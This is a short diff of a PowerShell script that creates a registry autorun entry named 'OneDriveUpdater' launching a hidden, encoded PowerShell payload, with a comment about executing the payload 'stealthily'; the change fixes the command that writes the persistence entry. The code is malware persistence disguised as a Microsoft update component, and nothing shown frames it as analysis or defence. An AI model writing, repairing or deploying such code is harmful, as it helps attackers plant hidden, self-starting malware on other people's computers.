@@ -22,7 +22,7 @@ $entryName = "OneDriveUpdater"
 $entryValue = "powershell.exe -nop -windowstyle hidden -encodedcommand $encodedPayload"
 
 # Create the registry entry
-Set-ItemProperty -Path $regPath -Name $entryName -Value $entryValue -PropertyType String - Force
+New-ItemProperty -Path $regPath -Name $entryName -Value $entryValue -PropertyType String - Force
 
 
 # Execute payload immediately (stealthily)
